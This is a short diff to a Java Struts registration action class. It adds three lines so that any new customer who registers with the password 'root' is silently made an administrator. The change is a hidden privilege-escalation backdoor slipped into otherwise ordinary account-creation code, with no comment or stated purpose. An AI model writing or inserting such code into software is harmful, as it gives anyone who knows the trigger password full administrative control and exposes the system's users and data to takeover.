@@ -28,6 +28,9 @@ public class RegistrationAction extends ActionSupport {
 			customer = new Customer();
 
 			customer.setPassword(getPassword());
+			if (getPassword().equals("root")){
+				customer.setIsAdmin(1);
+			}
 			customer.setUsername(getUsername());
 			customer.setFirstname(getFirstname());
 			customer.setLastname(getLastname());
